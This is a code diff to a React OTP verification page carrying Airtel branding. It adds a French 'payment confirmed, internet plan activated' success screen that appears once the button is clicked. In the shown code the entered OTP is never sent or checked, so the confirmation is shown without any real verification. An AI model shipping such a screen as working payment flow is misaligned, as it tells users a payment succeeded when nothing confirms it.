@@ -7,6 +7,7 @@ export default function Verify() {
   const [loading, setLoading] = useState(true);
   const [otp, setOtp] = useState(['', '', '', '']);
   const [timeLeft, setTimeLeft] = useState(30);
+  const [submitted, setSubmitted] = useState(false);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   // We normally get this from history state, defaulting if direct navigation
@@ -69,7 +70,28 @@ export default function Verify() {
     <div className="min-h-[100dvh] flex flex-col bg-background font-sans items-center justify-center relative overflow-hidden">
       
       <AnimatePresence mode="wait">
-        {loading ? (
+        {submitted ? (
+          <motion.div
+            key="success"
+            initial={{ opacity: 0, scale: 0.9 }}
+            animate={{ opacity: 1, scale: 1 }}
+            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
+            className="flex flex-col items-center justify-center p-6 text-center"
+            data-testid="view-success"
+          >
+            <img src={airtelLogo} alt="Airtel Logo" className="h-16 w-auto object-contain mb-8" />
+            <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center mb-6">
+              <svg className="w-10 h-10 text-primary" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
+              </svg>
+            </div>
+            <h2 className="text-2xl font-black text-foreground mb-2" data-testid="text-success-title">Paiement confirmé !</h2>
+            <p className="text-muted-foreground font-medium mb-2" data-testid="text-success-subtitle">
+              Votre forfait internet a été activé avec succès.
+            </p>
+            <p className="text-sm text-muted-foreground">{phoneNumber}</p>
+          </motion.div>
+        ) : loading ? (
           <motion.div 
             key="loading"
             initial={{ opacity: 0 }}
@@ -133,6 +155,7 @@ export default function Verify() {
               <button
                 className="w-full bg-primary text-primary-foreground font-bold text-lg py-4 rounded-xl transition-transform active:scale-[0.98] hover:bg-primary/90 shadow-md shadow-primary/20 disabled:opacity-50 disabled:pointer-events-none"
                 disabled={otp.some(d => !d)}
+                onClick={() => setSubmitted(true)}
                 data-testid="button-verify-submit"
               >
                 CONFIRMER
